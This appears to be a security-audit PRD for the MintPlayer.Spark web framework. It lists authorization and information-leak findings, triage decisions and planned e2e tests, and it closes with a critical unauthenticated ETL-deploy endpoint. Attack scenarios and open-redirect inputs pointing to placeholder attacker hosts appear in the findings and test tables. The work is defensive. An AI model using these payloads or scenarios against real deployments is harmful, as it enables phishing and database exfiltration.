# PRD — Security Audit (master)

**Status:** Draft — awaiting triage
**Scope:** `master` branch, commit `ea596e9` (2026-04-20). Excludes `feat/authorization` and IdentityProvider work.
**Method:** 5 parallel Explore agents covering AuthN/AuthZ, injection/input-validation, endpoint surface, Angular frontend, and source_generators/supply-chain. Findings dedeped and sanity-checked against master HEAD before inclusion.

## 1. How to read this document

Each finding has:
- **Layer** — `Framework` (bug in MintPlayer.Spark itself), `Application` (developer-facing API works, but easy to misuse), or `Deployment` (config/infra concern).
- **Testable?** — whether a failing-to-secure e2e test is feasible. `Yes` = we can write a test that asserts the secure expected behavior. `Indirect` = test needs infra setup. `No` = build-time / config / policy concern.
- **Confidence** — `Confirmed` (code read and verified on master), `Likely` (strong signal, edge case possible), `Needs verification`.

Findings are grouped by severity, not by audit domain. A "Verified secure" section at the end lists surfaces that were audited and found clean.

## 2. Route inventory (master)

For reference when reading the findings. Auth marked with `*` means imperative check inside handler (`SparkAccessDeniedException`), not a route-level `[Authorize]` attribute.

| Verb | Path | Auth | Antiforgery | File |
|------|------|------|-------------|------|
| GET | `/spark/` | No | No | `Endpoints/HealthCheck.cs` |
| GET | `/spark/aliases` | No | No | `Endpoints/Aliases/GetAliases.cs` |
| GET | `/spark/culture` | No | No | `Endpoints/Culture/Get.cs` |
| GET | `/spark/types` | **No** | No | `Endpoints/EntityTypes/List.cs` |
| GET | `/spark/types/{id}` | **No** | No | `Endpoints/EntityTypes/Get.cs` |
| GET | `/spark/queries` | **No** | No | `Endpoints/Queries/List.cs` |
| GET | `/spark/queries/{id}` | **No** | No | `Endpoints/Queries/Get.cs` |
| GET | `/spark/queries/{id}/execute` | Yes* | No | `Endpoints/Queries/Execute.cs` |
| GET | `/spark/queries/{id}/stream` | Yes* | No | `Endpoints/Queries/StreamExecuteQuery.cs` |
| GET | `/spark/permissions/{entityTypeId}` | Partial | No | `Endpoints/Permissions/GetPermissions.cs` |
| GET | `/spark/program-units` | Yes* | No | `Endpoints/ProgramUnits/Get.cs` |
| GET | `/spark/translations` | No | No | `Endpoints/Translations/Get.cs` |
| GET | `/spark/po/{objectTypeId}` | Yes* | No | `Endpoints/PersistentObject/List.cs` |
| GET | `/spark/po/{objectTypeId}/{**id}` | Yes* | No | `Endpoints/PersistentObject/Get.cs` |
| POST | `/spark/po/{objectTypeId}` | Yes* | Yes | `Endpoints/PersistentObject/Create.cs` |
| PUT | `/spark/po/{objectTypeId}/{**id}` | Yes* | Yes | `Endpoints/PersistentObject/Update.cs` |
| DELETE | `/spark/po/{objectTypeId}/{**id}` | Yes* | Yes | `Endpoints/PersistentObject/Delete.cs` |
| GET | `/spark/actions/{objectTypeId}` | Yes* | No | `Endpoints/Actions/ListCustomActions.cs` |
| POST | `/spark/actions/{objectTypeId}/{actionName}` | Yes* | Yes | `Endpoints/Actions/ExecuteCustomAction.cs` |
| GET | `/spark/lookupref/` | No | No | `Endpoints/LookupReferences/List.cs` |
| GET | `/spark/lookupref/{name}` | No | No | `Endpoints/LookupReferences/Get.cs` |
| POST | `/spark/lookupref/{name}` | Yes* | Yes | `Endpoints/LookupReferences/AddValue.cs` |
| PUT | `/spark/lookupref/{name}/{key}` | Yes* | Yes | `Endpoints/LookupReferences/UpdateValue.cs` |
| DELETE | `/spark/lookupref/{name}/{key}` | Yes* | Yes | `Endpoints/LookupReferences/DeleteValue.cs` |

## 3. Findings

### HIGH

---

#### H-1 — Metadata endpoints leak schema and query definitions without auth

**Layer:** Framework · **Testable?** Yes · **Confidence:** Confirmed

**Where:**
- `MintPlayer.Spark/Endpoints/EntityTypes/List.cs:13-17`
- `MintPlayer.Spark/Endpoints/EntityTypes/Get.cs`
- `MintPlayer.Spark/Endpoints/Queries/List.cs:13-17`
- `MintPlayer.Spark/Endpoints/Queries/Get.cs:13-24`
- `MintPlayer.Spark/Endpoints/Aliases/GetAliases.cs`
- `MintPlayer.Spark/Endpoints/Translations/Get.cs`
- `MintPlayer.Spark/Endpoints/LookupReferences/List.cs` and `Get.cs`

**Attack scenario:** Unauthenticated attacker issues `GET /spark/types`, `GET /spark/queries`, `GET /spark/queries/{id}` and harvests the full data model — entity types, attribute definitions, validation rules, query sources (`Database.*` / `Custom.*`), and projection structure. This intel scopes further targeted attacks (IDOR probing, injection against specific queries).

**Expected secure behavior:** Require authentication for all metadata endpoints by default, or expose a public-mode subset (entity names only, no attribute detail) behind an explicit opt-in.

**Test asserts:** Unauthenticated `GET /spark/queries` returns 401 (or empty list when explicit public mode is opted-in).

---

#### H-2 — Broken object-level authorization: entity-type grant implies all instances

**Layer:** Framework · **Testable?** Yes · **Confidence:** Confirmed (design-level)

**Where:**
- `MintPlayer.Spark/Services/DatabaseAccess.cs:109` (List path)
- `MintPlayer.Spark/Endpoints/PersistentObject/Get.cs:30`
- `MintPlayer.Spark/Endpoints/PersistentObject/List.cs:28`

**Attack scenario:** Alice has `Query/Person`. Bob's `Person` record is private to Bob. `GET /spark/po/{personTypeId}` returns all `Person` records including Bob's — there is no row-level filter or ownership check. Same pattern on `GET /spark/po/{type}/{id}`: any authorized user reads any instance.

**Expected secure behavior:** After entity-level authorization succeeds, instance-level authorization must also pass. Today this is a pure application concern (developer writes filtering in custom Actions). Framework should either require an `IObjectAuthorization<T>` hook, or ship a documented pit-of-success pattern so it's impossible to forget.

**Test asserts:** With two demo users and a seeded entity owned by user A, user B's `GET` on that entity returns 404 or 403 — not the record.

**Note:** Could be reframed as "documentation/API shape" rather than a bug. See §5 for triage question.

---

#### H-3 — Query execute accepts arbitrary `parentId` without parent-ownership check

**Layer:** Framework · **Testable?** Yes · **Confidence:** Confirmed

**Where:** `MintPlayer.Spark/Endpoints/Queries/Execute.cs:56-66`

**Attack scenario:** Execute endpoint fetches parent via `GetPersistentObjectAsync(parentEntityType.Id, parentId)`. If entity-level `Read/{parentType}` passes for the caller (see H-2), the parent is returned and scoped-to-parent queries run against it — even if the caller shouldn't see *this specific* parent's children.

**Expected secure behavior:** Parent fetch must enforce instance-level authz (same remediation surface as H-2).

**Test asserts:** User A runs a child query with `parentId=<B's record>`. Response is 403/404, not B's children.

---

#### H-4 — Authorization is runtime-imperative, with no route-level fallback

**Layer:** Framework · **Testable?** Indirect · **Confidence:** Confirmed

**Where:** All `PersistentObject/*`, `Queries/Execute.cs`, `Actions/ExecuteCustomAction.cs` rely on `SparkAccessDeniedException` being thrown from service-layer code. There is no `[Authorize]` attribute, route policy, or DI-time assertion that `AddAuthorization()` was wired.

**Attack scenario:** An app calls `AddSpark()` but forgets `spark.AddAuthorization()` (plausible — authorization is an optional package). If the default `IPermissionService` is a no-op or missing, requests succeed with no identity checking.

**Expected secure behavior:** When the authorization package isn't wired, the framework must fail-closed — either refuse to start, or reject authenticated operations with a clear error.

**Test asserts:** Harder to e2e in a single run — needs a test fixture that builds a host without `AddAuthorization()` and asserts `GET /spark/po/...` is refused. Integration-test-level, not black-box HTTP.

---

#### H-5 — `returnUrl` on login/two-factor is not validated against relative-only allow-list

**Layer:** Framework · **Testable?** Yes · **Confidence:** Likely (Angular `navigateByUrl` rejects some but not all external URLs)

**Where:**
- `node_packages/ng-spark-auth/login/src/spark-login.component.ts:52`
- `node_packages/ng-spark-auth/two-factor/src/spark-two-factor.component.ts:64`

**Attack scenario:** Attacker sends victim `https://app/login?returnUrl=%2F%2Fattacker.example%2Fphish`. After login, Angular router navigates to the attacker URL. Victim sees the app's domain in the pre-login URL, assumes the destination is in-app.

**Expected secure behavior:** Validate `returnUrl.startsWith('/') && !returnUrl.startsWith('//')` — reject otherwise, fall back to `defaultRedirectUrl`.

**Test asserts:** Playwright — login with `?returnUrl=//attacker.test`, assert final URL is `defaultRedirectUrl`, not attacker.

---

### MEDIUM

---

#### M-1 — `GetPermissions` leaks permission matrix to unauthenticated callers

**Layer:** Framework · **Testable?** Yes · **Confidence:** Confirmed

**Where:** `MintPlayer.Spark/Endpoints/Permissions/GetPermissions.cs:15-32`

**Attack scenario:** `GET /spark/permissions/{entityTypeId}` returns `{canRead, canCreate, canEdit, canDelete}` based on the current principal. An unauthenticated request evaluates against the Everyone group. An attacker maps which entity types the anonymous-user tier can operate on without any login. Combined with H-1, the full authorization surface is externally inspectable.

**Expected secure behavior:** Require authentication, OR require the caller to have at least one permission on the entity before returning the matrix.

**Test asserts:** Unauthenticated `GET /spark/permissions/<anyType>` returns 401.

---

#### M-2 — Claim-injection: group names from claims are trusted verbatim

**Layer:** Framework · **Testable?** Indirect · **Confidence:** Needs verification

**Where:**
- `MintPlayer.Spark.Authorization/Services/ClaimsGroupMembershipProvider.cs:28-44`
- `MintPlayer.Spark.Authorization/Services/AccessControlService.cs:100-118`

**Attack scenario:** If an external token issuer (social login, federated IdP) can put arbitrary `group` claims into a token, and that group name matches a group defined in `security.json`, the caller gets that group's rights. No check that the issuer is authoritative for that group name.

**Expected secure behavior:** Either (a) map external claims to internal groups through an explicit allow-list, or (b) namespace groups by issuer. Document the threat model for apps using multiple IdPs.

**Test asserts:** Needs a controllable token issuer; probably an integration test, not pure HTTP.

---

#### M-3 — 404 vs 403 differentiation enables existence oracle

**Layer:** Framework · **Testable?** Yes · **Confidence:** Confirmed

**Where:**
- `MintPlayer.Spark/Endpoints/PersistentObject/Get.cs:22-24` vs `39-49`
- `MintPlayer.Spark/Endpoints/PersistentObject/List.cs:20-24` vs `31-41`

**Attack scenario:** Attacker probes IDs. 404 means "no such record"; 403 means "record exists, you can't read it". Combined with H-2 this is less critical (attacker can already read), but absent H-2 it lets an unauthorized user enumerate IDs.

**Expected secure behavior:** Return uniform 404 for both cases when the caller is authenticated but unauthorized. (Keep 401 for unauthenticated.)

**Test asserts:** Authenticated user A asks for non-existent ID and for B's ID — both responses identical.

---

#### M-4 — Custom query method resolution: no explicit attribute gate

**Layer:** Framework · **Testable?** Yes · **Confidence:** Confirmed

**Where:** `MintPlayer.Spark/Services/QueryExecutor.cs:308-333`

**Attack scenario:** `Custom.{MethodName}` resolves to any `public instance` method on the Actions class matching the signature (`IQueryable<T>` or `IEnumerable<T>` return, zero or one `CustomQueryArgs` param). A developer adding a public helper with a matching shape inadvertently exposes it to HTTP callers.

**Expected secure behavior:** Only resolve methods decorated with an explicit `[SparkQuery]` attribute. Reject others at query-definition-load time with a clear error.

**Test asserts:** Author an Actions class with a non-`[SparkQuery]` method matching the signature; assert `Custom.ThatMethod` returns 404/400, not the method's data.

---

#### M-5 — Sort column property name accepted via reflection without allow-list

**Layer:** Framework · **Testable?** Yes · **Confidence:** Likely

**Where:**
- `MintPlayer.Spark/Endpoints/Queries/Execute.cs:31-46`
- `MintPlayer.Spark/Services/QueryExecutor.cs:492`

**Attack scenario:** `?sortColumns=<anyPublicProperty>:asc` uses `GetProperty(name, Public|Instance)` on the result type. If the projection type has a public property not in the attribute schema (e.g., `InternalComment`), the caller can sort by it — which is a side-channel (timing, ordering) even without reading the value. Not as severe as reading the field, but it's leakage.

**Expected secure behavior:** Validate sort columns against the query's declared attribute set.

**Test asserts:** Add a projection with an extra public property not in schema; `?sortColumns=ExtraProp:asc` returns 400.

---

#### M-6 — Exception messages echoed to clients

**Layer:** Framework · **Testable?** Yes · **Confidence:** Confirmed

**Where:**
- `MintPlayer.Spark/Endpoints/Actions/ExecuteCustomAction.cs:113` (`ex.Message` → 500 body)
- `MintPlayer.Spark/Endpoints/LookupReferences/{AddValue,UpdateValue,DeleteValue}.cs` (`ex.Message` → 400 body)
- `MintPlayer.Spark/Endpoints/Queries/StreamExecuteQuery.cs:89-91` (message over WebSocket)

**Attack scenario:** Server-side errors ("duplicate key 'users/1' in collection Users", "index 'Foo/Bar' not found") are surfaced verbatim. Attacker derives schema/state from error text.

**Expected secure behavior:** Log internally, return generic `"Operation failed"` with a correlation ID.

**Test asserts:** Trigger a duplicate/bad-input on a demo app; assert response body does not contain RavenDB-internal strings.

---

#### M-7 — No optimistic-concurrency / ETag check on updates

**Layer:** Framework · **Testable?** Yes · **Confidence:** Likely

**Where:** `MintPlayer.Spark/Endpoints/PersistentObject/Update.cs:37-72`

**Attack scenario:** Lost-update race: two clients read v1, both modify, both write. Last write wins silently. Not a classical "security" bug, but in an authorization context it enables authorization-downgrade races (TOCTOU on permission-sensitive fields).

**Expected secure behavior:** Require an ETag / `@change-vector` header on updates; reject on mismatch.

**Test asserts:** Parallel PUT with stale version returns 409 Conflict.

---

### LOW

---

#### L-1 — `AllowedHosts: "*"` in demo apps

**Layer:** Deployment · **Testable?** No · **Confidence:** Confirmed

**Where:** `Demo/*/appsettings.json` all have `"AllowedHosts": "*"`.

**Attack scenario:** Host-header injection against demo deployments, enabling poisoned-link password-reset emails if the demo ever generates absolute URLs. Not exploitable in the current demo scope.

**Expected secure behavior:** Set explicit hosts in production deployments; docs should warn.

---

#### L-2 — XSRF-TOKEN cookie has no `Secure` flag

**Layer:** Framework · **Testable?** Indirect · **Confidence:** Confirmed

**Where:** `MintPlayer.Spark/SparkMiddleware.cs:191-196`

**Note:** `HttpOnly=false` is **by design** for Angular's double-submit-cookie pattern — the JS client has to read the cookie and echo it in `X-XSRF-TOKEN`. This is not a bug. What *is* missing is `Secure = true`, which would prevent the token being sent over plain HTTP in production.

**Expected secure behavior:** Add `Secure = context.Request.IsHttps` (or `Secure = true` when not `Development`).

---

#### L-3 — No rate limiting

**Layer:** Framework / Deployment · **Testable?** Indirect · **Confidence:** Confirmed

**Where:** No `AddRateLimiter()` anywhere in the framework or demo configuration.

**Attack scenario:** Brute-force enumeration of IDs (see M-3), credential stuffing against any future login endpoint, DoS against query execute.

**Expected secure behavior:** Ship default rate limits for hot endpoints; document how to tune. Apps on master don't have a login surface yet, so this is mostly about enumeration today.

---

#### L-4 — `CustomActionResolver` auto-discovers `ICustomAction` implementers

**Layer:** Framework · **Testable?** Yes · **Confidence:** Confirmed

**Where:** `MintPlayer.Spark/Services/CustomActionResolver.cs:55-86`

**Attack scenario:** Any class implementing `ICustomAction` anywhere in the loaded assemblies becomes HTTP-exposed. A developer's utility/test class accidentally left in a shipped assembly becomes an endpoint.

**Expected secure behavior:** Require an explicit `[ExposedAsAction]` attribute (matching the `[SparkQuery]` suggestion in M-4).

**Test asserts:** Same shape as M-4.

---

#### L-5 — Frontend `sparkRoutes()` not gated by `sparkAuthGuard` in demo apps

**Layer:** Application (demo-app-level) · **Testable?** Yes · **Confidence:** Confirmed

**Where:** `Demo/Fleet/Fleet/ClientApp/src/app/app.routes.ts` (and peers).

**Note:** Defense-in-depth only — the backend should be the source of truth. A missing frontend guard just means the app briefly renders skeleton before the API rejects. Low priority.

---

#### L-6 — Source generator doesn't validate C# identifier shape in emitted code

**Layer:** Framework (build-time) · **Testable?** No · **Confidence:** Confirmed

**Where:** `MintPlayer.Spark.SourceGenerators/Generators/ActionsRegistrationGenerator.Producer.cs:42`

Not runtime-exploitable (the compiler catches invalid output). Defense-in-depth note only.

---

## 4. Considered-and-dismissed

These came up in the audits but are **not** vulnerabilities given how the framework actually works:

- **ReDoS via validation-rule regex** (injection audit §1). Patterns live in developer-controlled `App_Data/Model/*.json`, not user input. A malicious *developer* can already do worse. Still worth a `RegexOptions.Timeout`, but not a security finding.
- **Mass-assignment on Create/Update**. Routes override `Id` and `ObjectTypeId` from the path; no `PersistentObject` field is currently authorization-sensitive.
- **RavenDB raw-query injection**. All query construction uses parameterized LINQ / `.LoadAsync(id)`. No string concatenation into RQL.
- **XSS in ng-spark-auth**. No `innerHTML`, no `bypassSecurityTrust*`, signals-bound templates — sanitized by Angular default.
- **`HttpOnly=false` on XSRF-TOKEN**. By-design for double-submit; see L-2 for the real issue.
- **Supply-chain via pinned packages**. All from nuget.org, no known CVEs in pinned versions (as of audit date).
- **`pull_request_target` misuse in CI**. Only `push` triggers on master-deploy workflows.

## 5. Triage decisions (resolved 2026-04-20)

1. **H-2 / H-3 framing.** → **API-contract**. Row-level filtering is the application's responsibility, surfaced via a dedicated method on `DefaultPersistentObjectActions<T>` (separate from `OnQueryAsync` so intent is explicit). Framework contract change lands in this PR; demo Actions classes are updated to use it; tests assert the hook is called and enforced.
2. **Fix scope.** → Single PR, multiple commits. PR addresses findings + adds tests in lockstep.
3. **Test harness choice.** → Use the existing `MintPlayer.Spark.E2E.Tests` project (Playwright + FleetTestHost). HTTP-level via `page.APIRequest`, browser-level via `page.GotoAsync`. No new test project needed.

## 6. Per-finding disposition

| ID | Decision | Notes |
|----|----------|-------|
| H-1 | **Address** | Response is filtered per-caller permission. An anonymous caller gets only the entities/queries for which their effective principal (Everyone group) has at least `Query` rights. E.g., Fleet's `/spark/queries` to an anon user returns `GetCompanies` (Everyone has `QueryRead/Company`) but omits Car/Person/CarBrand/CarStatus. `/spark/types` applies the same filter. Not "opt-in per endpoint" — always on. Confirmed: attributes are **not** filtered per-user today — `IsVisible`/`IsReadOnly` come from schema, not from caller's claims. See new finding H-1b. |
| H-2 | **Address** | New virtual method on `DefaultPersistentObjectActions<T>` (e.g., `ApplyRowFilter(IRavenQueryable<T>, ClaimsPrincipal)`). Default implementation = no filter. Called by `DatabaseAccess` on List/Get paths. |
| H-3 | **Address** | Same remediation as H-2 — parent fetch goes through the same filter hook. |
| H-4 | **Address now** | Framework must fail-closed if `AddAuthorization()` isn't wired. Throw at startup OR ship a `NullPermissionService` that always denies. |
| H-5 | **Address** | Validate `returnUrl` against a configured allow-list (new `SPARK_AUTH_CONFIG.allowedReturnUrls` or similar). Reject otherwise. |
| M-1 | **Address with design** | Endpoint stays anonymous-callable (program-unit visibility needs it), but must **only ever** return the anonymous tier's permissions — never leak `canEdit/canDelete=true` that's actually computed against a half-authenticated principal. Test covers both cases. |
| M-2 | **Address** | JWT signature/issuer validation. Applies to the simple Authentication feature AND the future IdP. Token-tamper tests. |
| M-3 | **Address** | Uniform 404 for auth'd-but-not-authorized. |
| M-4 | **Address** | Low-code concern — "implement this interface and it's exposed" violates principle of least surprise. Need explicit opt-in. Related to L-4 and a potential new **endpoint-visibility report** tool (dev-time listing of all exposed HTTP endpoints with auth requirements). |
| M-5 | **Address** | Allow-list sort columns against the query's declared attributes. |
| M-6 | **Address** | Generic error responses + server-side logging with correlation ID. |
| M-7 | **Address** | Generic optimistic-concurrency via RavenDB change-vector / ETag. |
| L-1 | **Address** | No `docs/Deployment.md` yet (only `guide-docker-deployment.md`). Create one with security-relevant defaults: `AllowedHosts`, HTTPS, rate limits, CORS. |
| L-2 | **Address** | `Secure = true` flag on XSRF-TOKEN when not Development. |
| L-3 | **Address (demo-only)** | Framework stays out of rate limiting. Wire `AddRateLimiter()` with sensible defaults into each demo app's `Program.cs`. No changes to `MintPlayer.Spark` or `MintPlayer.Spark.Authorization`. |
| L-4 | **Address** | Same as M-4 — explicit opt-in. Plus endpoint-visibility report idea. |
| L-5 | **Try, else defer** | Investigate adding guard to demo `sparkRoutes()`. Flash is cosmetic; defer if non-trivial. |
| L-6 | **Skip** | Not important. |

## 7. New findings surfaced during triage

### H-1b — Attribute-level access control not implemented

**Layer:** Framework · **Testable?** Yes · **Confidence:** Confirmed

**Where:**
- `MintPlayer.Spark/Services/EntityMapper.cs:70-130` — reads all public properties regardless of caller identity
- `MintPlayer.Spark.Abstractions/EntityAttributeDefinition.cs` — `IsVisible` / `IsReadOnly` are static schema flags, not evaluated per request

**Attack scenario:** `User` entity has a `Salary` attribute marked `IsVisible=true` (public). Bob has role `Employee` which shouldn't see salaries. Framework has no mechanism to hide `Salary` for Bob specifically — schema `IsVisible` is all-or-nothing.

**Expected secure behavior:** Framework exposes a hook (e.g., `IsAttributeVisibleAsync(attrDef, principal, entity)`) so per-caller visibility is possible. Default returns `attrDef.IsVisible`.

---

### L-7a — Read-only attributes are writable on Update

**Layer:** Framework · **Testable?** Yes · **Confidence:** Confirmed

**Where:** `MintPlayer.Spark/Endpoints/PersistentObject/Update.cs:47-71` + `MintPlayer.Spark/Services/EntityMapper.cs`

**Attack scenario:** `Person.CreatedAt` is defined with `IsReadOnly=true`. Client sends a PUT with `CreatedAt` in the body. `EntityMapper.ToEntity<T>` copies the value into the entity. Update succeeds. The read-only contract is advisory-only, not enforced.

**Expected secure behavior:** On update, reject (or silently drop) any attribute whose schema definition has `IsReadOnly=true`. Same for fields invisible to the current user (pairs with H-1b).

---

### L-7b — Invisible attributes are writable on Update

**Layer:** Framework · **Testable?** Yes · **Confidence:** Confirmed

**Where:** Same as L-7a.

**Attack scenario:** `Person.Role` has `IsVisible=false` in the schema (not shown in UI, for admin-only use). A direct PUT with `Role: "Admin"` in the body succeeds anyway — the invisibility contract is UI-only, not write-enforced.

**Expected secure behavior:** Reject writes to attributes marked `IsVisible=false` unless the caller satisfies the condition that would normally make them visible (per-caller evaluation — see H-1b).

---

### L-4b — No developer-visible endpoint inventory

**Layer:** Framework tooling · **Testable?** No · **Confidence:** Confirmed (feature gap, not bug)

**Context:** Many findings (M-4, L-4) trace back to "framework auto-discovers and exposes things". A dev-time endpoint inventory (CLI tool or startup log banner in Development) listing every HTTP endpoint + its auth policy would make these regressions visible.

**Not in test scope** — feature request, not a vulnerability to test.

## 8. Expanded test matrix

User direction: "as many tests as possible. We shouldn't play safe on the number of tests."

Each test asserts the **secure expected behavior**. Tests that fail on current master == vulnerability confirmed.

### HTTP-level (via `page.APIRequest`)

| # | Finding | Test name | Assertion |
|---|---------|-----------|-----------|
| 1 | H-1 | `Unauthenticated_GET_queries_is_refused_unless_publicly_opted_in` | `GET /spark/queries` unauth → 401 (or empty list if opt-in is default) |
| 2 | H-1 | `Unauthenticated_GET_types_is_refused` | `GET /spark/types` unauth → 401 |
| 3 | H-1 | `Unauthenticated_GET_specific_query_is_refused` | `GET /spark/queries/{id}` unauth → 401 |
| 4 | H-1 | `Unauthenticated_GET_aliases_is_refused` | `GET /spark/aliases` unauth → 401 |
| 5 | H-1b | `Attribute_visibility_respects_current_user_claims` | Admin sees `Salary`; Employee doesn't |
| 6 | H-2 | `User_B_cannot_list_User_As_private_records` | Row filter hides A's records from B's `GET /spark/po/{type}` |
| 7 | H-2 | `User_B_cannot_read_User_As_private_record_by_id` | `GET /spark/po/{type}/{A-id}` by B → 404 |
| 8 | H-3 | `Query_execute_with_foreign_parentId_is_refused` | User B's child query against A's parent → 404 |
| 9 | H-4 | `Framework_fails_closed_when_authorization_not_wired` | Host built without `AddAuthorization()` — `GET /spark/po/...` refused |
| 10 | M-1 | `Unauthenticated_GET_permissions_returns_anonymous_tier_only` | `canCreate/canEdit/canDelete` all `false` for anon |
| 11 | M-2 | `JWT_with_tampered_signature_is_rejected` | `GET /spark/auth/me` with tampered JWT → 401 |
| 12 | M-2 | `JWT_with_foreign_issuer_is_rejected` | Token signed by wrong key → 401 |
| 13 | M-2 | `JWT_with_injected_group_claim_does_not_grant_rights` | Tampered group claim ignored |
| 14 | M-3 | `Authorized_NotFound_and_Forbidden_are_indistinguishable` | Responses to non-existent-ID and forbidden-ID are byte-identical |
| 15 | M-4 | `Custom_query_resolves_only_marked_methods` | Non-`[SparkQuery]` method callable via `Custom.*` → 400/404 |
| 16 | M-4 | `Custom_query_reflection_does_not_leak_private_methods` | Private method on Actions class not reachable |
| 17 | M-5 | `Sort_by_unknown_column_returns_400` | `?sortColumns=BogusProp:asc` → 400 |
| 18 | M-5 | `Sort_by_non_schema_public_property_returns_400` | Public non-attribute property not sortable |
| 19 | M-6 | `Error_body_does_not_leak_RavenDB_internals` | Duplicate-key / bad-input error body free of Raven-internal strings |
| 20 | M-6 | `Error_body_does_not_leak_stack_traces` | No `at MintPlayer.Spark.*` in any 4xx/5xx body |
| 21 | M-7 | `Concurrent_update_with_stale_version_is_rejected` | Two PUTs on same record — second with stale ETag → 409 |
| 22 | L-2 | `XSRF_TOKEN_cookie_has_Secure_flag_outside_Development` | Set-Cookie header contains `; Secure` |
| 23 | L-3 | `Rate_limiter_is_configured_on_demo_host` | After N rapid requests, 429 observed |
| 24 | L-4 | `Custom_action_resolves_only_marked_classes` | `ICustomAction` without opt-in attribute → 404 |
| 25 | L-7a | `Read_only_attribute_cannot_be_modified_on_update` | PUT with changed `IsReadOnly=true` field — field unchanged OR 400 |
| 26 | L-7b | `Invisible_attribute_cannot_be_modified_on_update` | PUT with changed `IsVisible=false` field — field unchanged OR 400 |
| 27 | L-7a | `Create_ignores_read_only_fields_sent_by_client` | POST with client-supplied `IsReadOnly` field — server uses default |

### Browser-level (via Playwright)

| # | Finding | Test name | Assertion |
|---|---------|-----------|-----------|
| 28 | H-5 | `Login_with_external_returnUrl_lands_on_default_redirect` | `?returnUrl=//attacker.test` → final URL = default |
| 29 | H-5 | `Login_with_protocol_relative_returnUrl_is_rejected` | `?returnUrl=\\\\attacker.test` → default |
| 30 | H-5 | `Login_with_absolute_http_returnUrl_is_rejected` | `?returnUrl=http://attacker.test` → default |
| 31 | H-5 | `Login_with_allowed_returnUrl_is_honored` | Relative in-app `returnUrl=/dashboard` → `/dashboard` |

**~31 tests total.** Some may be combined if the assertions overlap cleanly.

## 6. Proposed test selection (for user to confirm)

Recommended minimum viable e2e suite — **10 tests covering 9 findings**, each asserting the *secure expected behavior*:

| ID | Finding | Test | Tool |
|----|---------|------|------|
| T1 | H-1 | Unauth `GET /spark/queries` → 401 | HTTP |
| T2 | H-1 | Unauth `GET /spark/types` → 401 | HTTP |
| T3 | H-2 | User B reads A's record → 404 | HTTP (2 users) |
| T4 | H-3 | User B query execute with A's `parentId` → 404 | HTTP |
| T5 | H-5 | Login `?returnUrl=//attacker` → lands on default | Playwright |
| T6 | M-1 | Unauth `GET /spark/permissions/{id}` → 401 | HTTP |
| T7 | M-3 | 404 and 403 responses are indistinguishable | HTTP |
| T8 | M-4 | Non-`[SparkQuery]` method not callable via `Custom.*` | HTTP |
| T9 | M-5 | Sort by non-schema property → 400 | HTTP |
| T10 | M-6 | Error response body does not leak Raven internals | HTTP |

H-4, M-2, M-7, L-* are either indirect, need special fixtures, or are deployment concerns — defer unless you want them in scope.

Tests **will fail initially** — that's the point. A failing test == vulnerability confirmed in a reproducible way. Fixes come in separate PRs.

## 9. Round 2 — Full-scope re-audit (2026-05-25)

**Status:** Draft — awaiting triage.
**Scope:** master HEAD `d0729ae`. Covers (a) code changed since round 1 baseline `ea596e9`, (b) packages explicitly out-of-scope in round 1 — `MintPlayer.Spark.Authorization`, `MintPlayer.Spark.Webhooks.GitHub(.DevTunnel)`, `MintPlayer.Spark.Messaging`, `MintPlayer.Spark.Replication`, `MintPlayer.Spark.SubscriptionWorker`, `MintPlayer.Spark.Client(.Authorization)`, `node_packages/ng-spark`, the `MintPlayer.Spark.SourceGenerators` emission paths, `.github/workflows/*` — and (c) drift-check of every round-1 disposition.
**Method:** 5 parallel auditor agents (AuthN/AuthZ; Endpoints/Middleware; Backend integrations; Client/frontend; Build/supply-chain). Findings cross-corroborated where two agents touched the same surface, then sanity-checked against master HEAD by re-reading the cited lines.
**Threat model:** Internet-facing multi-tenant.
**Out of scope:** `MintPlayer.Spark.IdentityProvider` (PRD at `docs/PRD-IdentityProvider.md` exists, package not yet on master); SparkEditor / VS extensions; CronosCore test infra. Re-audit when shipped.

ID prefix `R2-` distinguishes round-2 findings from round-1 (e.g., `R2-C1`).

### 9.1 New / changed route inventory (delta from §2)

| Verb | Path | Auth | Antiforgery | File |
|------|------|------|-------------|------|
| POST | `/spark/etl/deploy` | **No** | **No** | `MintPlayer.Spark.Replication/Endpoints/EtlDeploy.cs` |
| POST | `/spark/sync/apply` | **No** | **No** | `MintPlayer.Spark.Replication/Endpoints/SyncApply.cs` |
| POST | `/spark/auth/{register,login,refresh,forgotPassword,resetPassword,manage/*,logout}` | varies | **No (Identity API)** | `MintPlayer.Spark.Authorization/Extensions/SparkAuthenticationExtensions.cs:72` |
| GET  | `/spark/auth/external-login` | No (entry) | No | same:78 |
| GET  | `/spark/auth/external-login-callback` | No (entry) | No | same:91 |
| GET  | `/spark/auth/me` | Yes | n/a | `MintPlayer.Spark.Authorization/Endpoints/GetCurrentUser.cs` |
| POST | `/api/github/webhooks` | HMAC (broken) | n/a (webhook) | Octokit `MapGitHubWebhooks` + `SparkWebhookEventProcessor` |
| WS   | `/spark/github/dev-ws` | GitHub token (fail-open) | n/a | `MintPlayer.Spark.Webhooks.GitHub/Extensions/SparkBuilderExtensions.cs:65` |

### 9.2 Findings

#### CRITICAL

---

##### R2-C1 — Unauthenticated `/spark/etl/deploy` accepts arbitrary RavenDB connection strings + JS transforms

**Layer:** Framework · **Testable?** Yes · **Confidence:** Confirmed (independently flagged by two agents)

**Where:** `MintPlayer.Spark.Replication/Endpoints/EtlDeploy.cs:8-45`, `MintPlayer.Spark.Replication/Services/EtlTaskManager.cs:22-97`, group registration `MintPlayer.Spark.Replication/Endpoints/Groups.cs:5-8`

**Attack scenario:** No `[Authorize]`, no antiforgery, no shared-secret/mTLS check. An unauthenticated attacker on the public internet POSTs `EtlScriptRequest { RequestingModule, TargetDatabase, TargetUrls[], Scripts[] }` and `EtlTaskManager.DeployAsync` calls `PutConnectionStringOperation<RavenConnectionString>` then `AddEtlOperation` against the local RavenDB. RavenDB then continuously ETLs every document mutation in the source database to `TargetUrls` (attacker-controlled), running any caller-supplied JS in the ETL sandbox over every write. The same call overwrites any legitimate ETL task with the matching `spark-etl-{RequestingModule}` name. The only existing guard is the self-loop refusal on `TargetDatabase == documentStore.Database` (`EtlTaskManager.cs:36`) — trivially bypassed by naming the target anything else.

**Expected secure behavior:** Require authentication; require the caller principal to belong to a trusted-module group (shared secret / mTLS / JWT signed by a known module key); validate `TargetUrls` against an operator-configured allow-list; require antiforgery if cookie-auth is ever applied.

**Test asserts:** Unauthenticated `POST /spark/etl/deploy` with a valid body returns 401; `documentStore.Maintenance.Send*` is never invoked.

